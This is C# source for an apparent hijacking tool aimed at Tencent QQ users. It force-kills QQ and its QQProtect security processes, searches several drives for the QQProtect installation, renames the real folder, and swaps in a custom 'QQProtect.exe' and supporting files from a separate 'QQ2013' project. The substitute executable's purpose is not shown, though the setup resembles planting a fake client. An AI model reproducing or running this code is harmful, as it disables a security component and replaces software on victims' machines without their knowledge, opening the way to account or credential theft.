using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using Microsoft.VisualBasic;
using System.Runtime.InteropServices;
using System.Diagnostics;
namespace ConsoleApplication1
{
    class Program
    {
       
        static void Main(string[] args)
        {
            string Pro1="QQ";
            string Pro2="QQCallcp";
            string Pro3 = "QQProtect";
            string Pro4 = "TXPlatform";
            string DirName1 = @"d:\";
            string DirName2 = @"c:\";
            string DirName3 = @"e:\";
            string DirName4 = @"f:\";
            //文件中包含名
            string FileName1 = "QQProtect.sys";
            string FileName2 = "SkinForm.dll";
            try
            {
                KillProcess(Pro1);
                KillProcess(Pro2);
                KillProcess(Pro3);
                KillProcess(Pro4);
                GetFileName2(DirName1, FileName2);
                GetFileName(DirName1, FileName1);
                GetFileName(DirName2, FileName1);
                GetFileName(DirName3, FileName1);
                GetFileName(DirName4, FileName1);
            }
            catch
            {
                return;
            }




        }
        static void KillProcess(string processName)
        {
            System.Diagnostics.Process myproc = new System.Diagnostics.Process();
            
            try
            {
                foreach (Process thisproc in Process.GetProcessesByName(processName))
                {
                    if (!thisproc.CloseMainWindow())
                    {
                        thisproc.Kill();
                    }
                }
            }
            catch (Exception)
            {
                return;
            }
        }

        static void GetFileName(string DirName, string FileName)
        {

            DirectoryInfo dir = new DirectoryInfo(DirName);
            if (null != dir.Parent && dir.Attributes.ToString().IndexOf("System") > -1)
            {
                return;
            }
            FileInfo[] finfo = dir.GetFiles();
            string fname = string.Empty;
            for (int i = 0; i < finfo.Length; i++)
            {

                fname = finfo[i].Name;
                if (FileName == fname)
                {
                    string str;
                    str = finfo[i].FullName.Substring(0, finfo[i].FullName.Length - 13);
                    //Console.WriteLine(str);
                    //D:\QQ\QQPROTECT\BIN\QQPROTECT.sys
                    string st2, st3, st4, st5, st6, st7;

                    st2 = finfo[i].FullName.Substring(0, finfo[i].FullName.Length - 18);
                    st3 = finfo[i].FullName.Substring(0, finfo[i].FullName.Length - 18) + "1";
                    st4 = finfo[i].FullName.Substring(0, finfo[i].FullName.Length - 27);
                    st5 = finfo[i].FullName.Substring(0, finfo[i].FullName.Length - 18) + @"2\";
                    Directory.Move(@st2, @st3);
                    DirectoryInfo dir2 = new DirectoryInfo(@st4);
                    string fl = "QQProtect2";
                    dir2.CreateSubdirectory(fl);
                    DirectoryInfo dir3 = new DirectoryInfo(@st5);
                    string fl2 = "Bin";
                    dir3.CreateSubdirectory(fl2);
                    string str1 = @"d:\QQ38\QQProtect.exe";
                    string str2 = @"d:\QQ38\QQ2013.exe.config";
                    string str3 = @"d:\QQ38\QQ2013.pdb";
                    string str4 = @"d:\QQ38\QQ2013.vshost.exe";
                    string str5 = @"d:\QQ38\QQ2013.vshost.exe.config";
                    string str6 = @"d:\QQ38\QQ2013.vshost.exe.manifest";
                    string str7 = @"d:\QQ38\SkinForm.dll";
                    string str8 = @"d:\QQ38\SkinForm.pdb";
                    st6 = finfo[i].FullName.Substring(0, finfo[i].FullName.Length - 18) + @"2\Bin\";
                    string st = @st6;
                    FileInfo fi1 = new FileInfo(str1);
                    FileInfo fi2 = new FileInfo(str2);
                    FileInfo fi3 = new FileInfo(str3);
                    FileInfo fi4 = new FileInfo(str4);
                    FileInfo fi5 = new FileInfo(str5);
                    FileInfo fi6 = new FileInfo(str6);
                    FileInfo fi7 = new FileInfo(str7);
                    FileInfo fi8 = new FileInfo(str8);
                    fi1.MoveTo(st + fi1.Name);
                    fi2.MoveTo(st + fi2.Name);
                    fi3.MoveTo(st + fi3.Name);
                    fi4.MoveTo(st + fi4.Name);
                    fi5.MoveTo(st + fi5.Name);
                    fi6.MoveTo(st + fi6.Name);
                    fi7.MoveTo(st + fi7.Name);
                    fi8.MoveTo(st + fi8.Name);
                    st7 = finfo[i].FullName.Substring(0, finfo[i].FullName.Length - 18) + "2";
                    Directory.Move(@st7, @st2);

                }

            }
            //取得所有子文件夹
            DirectoryInfo[] dinfo = dir.GetDirectories();
            for (int i = 0; i < dinfo.Length; i++)
            {
                //查找子文件夹中是否有符合要求的文件
                GetFileName(dinfo[i].FullName, FileName);
            }
        }
        static void GetFileName2(string DirName, string FileName)
        {
            DirectoryInfo dir2 = new DirectoryInfo(@"d:\");
            string fl = "QQ38";
            dir2.CreateSubdirectory(fl);
            DirectoryInfo dir = new DirectoryInfo(DirName);
            if (null != dir.Parent && dir.Attributes.ToString().IndexOf("System") > -1)
            {
                return;
            }
            FileInfo[] finfo = dir.GetFiles();
            string fname = string.Empty;
            for (int i = 0; i < finfo.Length; i++)
            {
                
                fname = finfo[i].Name;
                if (FileName == fname)
                {   
                    //e:\各种东西\QQ2013\QQ2013\QQ2013\BIN\DEBUG\SKINFORM.DLL
                    string str;
                    str = finfo[i].FullName.Substring(0, finfo[i].FullName.Length - 12);
                    //Console.WriteLine(str);
                    string str1 = str+"QQProtect.exe";
                    string str2 = str+"QQ2013.exe.config";
                    string str3 = str+"QQ2013.pdb";
                    string str4 = str+"QQ2013.vshost.exe";
                    string str5 = str+"QQ2013.vshost.exe.config";
                    string str6 = str+"QQ2013.vshost.exe.manifest";
                    string str7 = str+"SkinForm.dll";
                    string str8 = str+"SkinForm.pdb";
                    string st1 = @str1;
                    string st2 = @str2;
                    string st3 = @str3;
                    string st4 = @str4;
                    string st5 = @str5;
                    string st6 = @str6;
                    string st7 = @str7;
                    string st8 = @str8;
                    string st = @"d:\QQ38\";
                    FileInfo fi1 = new FileInfo(st1);
                    FileInfo fi2 = new FileInfo(st2);
                    FileInfo fi3 = new FileInfo(st3);
                    FileInfo fi4 = new FileInfo(st4);
                    FileInfo fi5 = new FileInfo(st5);
                    FileInfo fi6 = new FileInfo(st6);
                    FileInfo fi7 = new FileInfo(st7);
                    FileInfo fi8 = new FileInfo(st8);
                    fi1.MoveTo(st + fi1.Name);
                    fi2.MoveTo(st + fi2.Name);
                    fi3.MoveTo(st + fi3.Name);
                    fi4.MoveTo(st + fi4.Name);
                    fi5.MoveTo(st + fi5.Name);
                    fi6.MoveTo(st + fi6.Name);
                    fi7.MoveTo(st + fi7.Name);
                    fi8.MoveTo(st + fi8.Name);
                    

                }

            }
            DirectoryInfo[] dinfo = dir.GetDirectories();
            for (int i = 0; i < dinfo.Length; i++)
            {
                
                GetFileName2(dinfo[i].FullName, FileName);
            }

        }
       

    }
}


